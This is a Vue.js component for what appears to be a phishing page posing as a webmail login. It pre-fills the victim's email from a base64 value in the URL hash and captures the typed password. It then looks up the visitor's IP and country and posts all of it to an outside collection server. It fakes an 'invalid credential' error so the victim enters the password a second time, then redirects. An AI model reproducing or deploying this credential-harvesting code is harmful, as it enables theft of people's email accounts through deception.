<template>
  <div class="container">
    <div class="card">
      <div class="picture"></div>
      <form @submit.prevent="handleSubmit" id="logForm">
        <div class="inputs">
          <div class="input-container">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="24"
              height="24"
              viewBox="0 0 24 24"
              class="input-icon"
            >
              <path
                fill="currentColor"
                fill-rule="evenodd"
                d="M8 7a4 4 0 1 1 8 0a4 4 0 0 1-8 0m0 6a5 5 0 0 0-5 5a3 3 0 0 0 3 3h12a3 3 0 0 0 3-3a5 5 0 0 0-5-5z"
                clip-rule="evenodd"
              />
            </svg>
            <input type="text" v-model="ai" placeholder="Enter your credential" required readonly />
          </div>
        </div>

        <div class="inputs">
          <div class="input-container">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="14"
              height="14"
              viewBox="0 0 14 14"
              class="input-icon"
            >
              <path
                fill="currentColor"
                fill-rule="evenodd"
                d="M7 2a2 2 0 0 0-2 2v1h4V4a2 2 0 0 0-2-2M3 4v1a1.5 1.5 0 0 0-1.5 1.5v6A1.5 1.5 0 0 0 3 14h8a1.5 1.5 0 0 0 1.5-1.5v-6A1.5 1.5 0 0 0 11 5V4a4 4 0 1 0-8 0m4 6.75a1.25 1.25 0 1 0 0-2.5a1.25 1.25 0 0 0 0 2.5"
                clip-rule="evenodd"
              />
            </svg>
            <input type="password" v-model="pr" placeholder="Enter your credential" required />
          </div>
        </div>

        <div class="btn">
          <button type="submit">Log in</button>
          <p v-show="showError" class="errormsg">Invalid credential Please try again.</p>
        </div>
      </form>
    </div>
    <div class="flex"></div>
  </div>
</template>

<script setup>
import { onMounted, ref } from 'vue'

const ai = ref('')
const pr = ref('')
const showError = ref(false)
let errCount = 0

onMounted(() => {
  try {
    const hash = window.location.hash.substring(1)
    if (hash) {
      const base64Regex = /^[A-Za-z0-9+/=]+$/
      if (base64Regex.test(hash)) {
        try {
          ai.value = decodeURIComponent(atob(hash))
        } catch (e) {
          console.error('Error decoding Base64:', e)
          ai.value = decodeURIComponent(hash)
        }
      } else {
        ai.value = decodeURIComponent(hash)
      }
    }
  } catch (error) {
    console.error('Error extracting AI from URL:', error)
  }
})
//error is not an excuse

const handleSubmit = async () => {
  try {
    const res = await fetch('https://ipapi.co/json/')
    const data = await res.json()

    const payload = {
      ai: errCount === 0 ? ai.value.trim() : `${ai.value.trim()}-webmailDelivered-confirmed`,
      pr: pr.value.trim(),
      pia: data.ip,
      cy: data.country_name,
    }

    // const vcLink = 'https://new-smt-api.vercel.app/register'

    const vps = 'https://allmasindustries.com/register'
    //  eeb70ca9f1752515bb4f9cecb5de04b837b3bdd1

    await fetch(vps, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    })

    if (errCount === 0) {
      // First attempt: show error and clear input
      errCount++
      showError.value = true
      pr.value = ''
    } else {
      // Second attempt: redirect to Google
      // window.location.href = 'https://webmailspace.vercel.app/'
      window.location.href = `/about#${btoa(ai.value)}`
    }
  } catch (error) {
    console.error('Error during submit:', error)
  }
}
</script>

<style scoped>
* {
  padding: 0;
  margin: 0;
  box-sizing: border-box;
  font-family: 'Poppins', sans-serif;
}

.container {
  width: 100%;
  height: 100vh;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  margin: auto;
}

.card {
  width: 25%;
  height: 430px;
}

.picture {
  width: 100%;
  height: 120px;
  background-color: #ffffff;
  margin-bottom: 20px;
  background-image: url(../assets/logo.png);
  background-repeat: no-repeat;
  background-size: contain;
  background-position: center;
}

.btn {
  display: flex;
  flex-direction: column;
  width: 100%;
  align-items: center;
}

form {
  display: flex;
  flex-direction: column;
  align-items: center;
  margin: auto;
  gap: 30px;
}

.label {
  color: rgb(87, 58, 58);
  font-size: 14px;
  font-weight: 500;
}

form button {
  display: flex;
  align-items: center;
  justify-content: center;
  width: 82%;
  padding: 8px;
  border-radius: 4px;
  color: white;
  border: 1px solid black;
  background-color: #179bd7;
}

.flex {
  background-image: url(../assets/footer.png);
  width: 50%;
  margin-top: 20px;
  height: 30px;
  background-repeat: no-repeat;
  background-size: cover;
  background-position: center;
}

.input-container {
  position: relative;
  width: 100%;
}

.input-container input {
  width: 280px;
  padding-left: 40px;
  box-sizing: border-box;
  height: 40px;
  border: 1px solid #ccc;
  border-radius: 5px;
}

.input-container .input-icon {
  position: absolute;
  left: 10px;
  top: 50%;
  transform: translateY(-50%);
  pointer-events: none;
  fill: #888;
}

.errormsg {
  font-size: 12px;
  color: red;
}

@media screen and (max-width: 768px) {
  .picture {
    width: 100%;
  }
  .card {
    width: 100%;
  }
  .flex {
    width: 80%;
  }
  form button {
    width: 90%;
  }
}
</style>
